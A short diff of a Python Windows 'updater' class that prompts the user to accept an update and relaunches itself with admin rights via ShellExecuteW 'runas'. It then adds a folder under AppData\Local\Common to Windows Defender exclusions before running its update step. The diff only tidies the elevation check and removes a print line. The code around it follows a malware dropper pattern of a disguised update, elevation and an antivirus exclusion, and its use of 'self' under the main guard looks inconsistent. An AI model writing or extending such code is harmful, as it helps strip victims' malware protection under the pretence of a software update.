@@ -17,8 +17,8 @@ class Main:
                             "\nPress 'Y' or 'Enter' to update or 'N' to skip: ")
         return install_input.strip().lower() in ['y', '']
 
-    def request_admin_privileges(self):
-        return ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1) #Windows specific command to request admin privileges
+    def request_admin_privileges(self) -> bool:
+        return ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1) > 32
 
     def add_folder_to_windows_defender_exclusions(self):
         folder_path = f"{pl.Path.home() / 'AppData' / 'Local' / 'Common'}"
@@ -58,7 +58,6 @@ if __name__ == "__main__":
         if self.request_admin_privileges():
             print("Proceeding with update...")
             self.add_folder_to_windows_defender_exclusions()
-            print("Settingup complete. Restarting installer with admin privileges...")
             self.perform_update()
             exit(0)
         else:
